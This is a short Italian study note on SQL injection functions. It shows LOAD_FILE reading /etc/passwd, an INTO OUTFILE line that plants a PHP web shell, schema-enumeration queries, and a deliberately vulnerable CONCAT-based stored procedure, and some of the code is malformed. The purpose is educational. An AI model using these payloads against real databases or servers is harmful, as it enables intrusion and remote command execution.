queste sono un insieme di [[Funzioni in SQL]]

LOAD_FILE('/etc/passwd')
- questo può andare a visualizzare qualsiasi file all'interno del sistema operativo

SELECT "< ? php system($_ GET['cmd']): ?>"
INTO OUTFILE '/var/www/html/shell.php';

Per quanto riguarda i metadati
SELECT table_name FROM information_schema.tables; 
SELECT column_name FROM information_schema.columns WHERE table_nome='users';

Per difendersi da questo noi andiamo ad usare:
- stored procedure  (ma attenzione a non usare concat)
- sanificare il tutto

Attenzione perchè le procedures hanno comunque vulnerabilità

CREATE PROCEDURE get-user(IN u VARCHAR(50)
BEGIN 
	 SET @q=CONCAT(
	 'SELECT * FROM users WHERE username=''',
	 u,
	 );
	 PREPARE stmt FROM @q
	 EXECUTE stmt;
END;